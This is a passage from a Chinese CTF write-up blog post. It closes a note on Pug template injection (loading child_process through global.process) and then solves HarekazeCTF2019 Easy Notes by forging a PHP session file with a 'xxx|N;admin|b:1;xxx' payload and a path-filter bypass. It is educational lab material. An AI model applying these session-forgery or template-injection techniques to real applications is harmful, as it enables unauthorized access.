<p>不可以直接引用require，而是必须通过global.process的形式去加载child_process<br>原因的话可以参考：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681642856901-fea91dde-b76e-4fc3-87c7-01534c780fcf.png#averageHue=%232e2a2a&clientId=uc90309fc-07f8-4&from=paste&id=ude873bb7&name=image.png&originHeight=622&originWidth=1048&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=94529&status=done&style=none&taskId=ub4d2b8b1-b463-4fab-b29c-80c18e69510&title=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681642838422-8759f0cc-342e-4f7b-b338-902a223630e6.png#averageHue=%23f5f5f4&clientId=uc90309fc-07f8-4&from=paste&height=713&id=u386aaf65&name=image.png&originHeight=891&originWidth=1367&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=218557&status=done&style=none&taskId=u9d31df17-e151-49d7-843e-fd7e944294b&title=&width=1093.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681642844238-faaade21-c235-4280-96f3-dd59f94b666a.png#averageHue=%23b3b2b1&clientId=uc90309fc-07f8-4&from=paste&height=653&id=u806df92d&name=image.png&originHeight=816&originWidth=1436&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=247044&status=done&style=none&taskId=uecdc2fc3-0b43-40c4-a114-1ddf07da21c&title=&width=1148.8" alt="image.png"><br>PUG模板渲染是在Function方法里，在这个方法里也是不可以直接require的</p>
<h1 id="HarekazeCTF2019-Easy-Notes"><a href="#HarekazeCTF2019-Easy-Notes" class="headerlink" title="[HarekazeCTF2019]Easy Notes"></a>[HarekazeCTF2019]Easy Notes</h1><p>考点：PHPsession伪造；代码审计<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681651854749-9cd8eccd-0bc9-491d-95f5-5f1b5f907e82.png#averageHue=%23313a43&clientId=u02529203-accb-4&from=paste&height=718&id=ue22aab74&name=image.png&originHeight=897&originWidth=1843&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=126026&status=done&style=none&taskId=uec7b3644-f79a-479b-bc45-b114bceac7a&title=&width=1474.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681652030088-4c86aa33-9b02-4f8a-87cc-cbdc87c5723b.png#averageHue=%23fefdfd&clientId=u02529203-accb-4&from=paste&height=637&id=uf3151fe7&name=image.png&originHeight=796&originWidth=1459&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=90999&status=done&style=none&taskId=u34de5ff7-766a-46fc-bd1b-2672e7ee616&title=&width=1167.2" alt="image.png"><br>红框对应的2点分别是可控的文件名和可控的文件内容，文件名采用的就是登录的的用户名，文件内容就是我们定义的title，但是要注意是会有脏数据的<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681652275175-992385c9-78c4-4a4d-befe-a7f02f17fae8.png#averageHue=%2330302f&clientId=u02529203-accb-4&from=paste&height=202&id=u9fbd802d&name=image.png&originHeight=252&originWidth=723&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=27523&status=done&style=none&taskId=u30fb4d25-b01e-4d6c-b23f-b40cf40b9a3&title=&width=578.4" alt="image.png"><br>因为是压缩包的形式，所以需要考虑前后脏数据，现在的思路如下<br>我们可以往用户session文件写入半自定义的内容，PHPSESS默认的序列化机制是php默认引擎，当sess文件内容为<code>admin|b:1;</code>时，就会判断为true<br>那么前后的脏数据咋办呢，我们可以通过类似闭合的手法来实现<code>xxx|N;admin|b:1;xxx</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681652422009-56106054-2851-4e37-bd3f-f77379354048.png#averageHue=%23323b45&clientId=u02529203-accb-4&from=paste&height=110&id=uddf094d0&name=image.png&originHeight=138&originWidth=774&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=20201&status=done&style=none&taskId=u53b14059-5416-41a2-941e-9a490bb8e60&title=&width=619.2" alt="image.png"><br>一开始会把<code>..</code>替换为空，本意是为了防止目录穿越，可是当type为.时，那么文件名我们就可以控制为<code>sess_-xxxxx</code>的形式了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681653035183-e7eb90e8-a343-4f78-b872-07573886525b.png#averageHue=%23f8f8f8&clientId=u7462a3d8-c5de-4&from=paste&height=390&id=uf383f900&name=image.png&originHeight=487&originWidth=1612&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=28328&status=done&style=none&taskId=ua1b76b2c-d2ed-4d79-ae33-44253c6a162&title=&width=1289.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681653066060-0e77a99e-1862-46ad-9701-87e87518585d.png#averageHue=%23353434&clientId=u7462a3d8-c5de-4&from=paste&height=473&id=u97cee31b&name=image.png&originHeight=591&originWidth=1470&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=123316&status=done&style=none&taskId=u30c0995d-0f28-42bf-8eac-1c525f7574d&title=&width=1176" alt="image.png"><br>之后可以看到sess文件名字<code>sess_-0290458e0c8555ed</code>，我们把PHPSESSID的值改为<code>-0290458e0c8555ed</code>，即可获取flag！<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681653091032-dfe72e97-4b7b-46f7-aaf1-6a1701a04eef.png#averageHue=%23f3f3f3&clientId=u7462a3d8-c5de-4&from=paste&height=726&id=ub342b4a7&name=image.png&originHeight=908&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=81513&status=done&style=none&taskId=u9dbab6b8-077b-4528-a1a1-089cf07da44&title=&width=1536" alt="image.png"></p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/BUUCTF/" class="tag">#BUUCTF</a><a href="/tags/刷题记录/" class="tag">#刷题记录</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/04/19/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF%202023%20Web%20Writeup/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">红明谷CTF 2023 Web writedup</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/04/14/Absolute%20Writeup%20By%20Boogipop/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">HTB Absolute Writeup By Boogipop</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>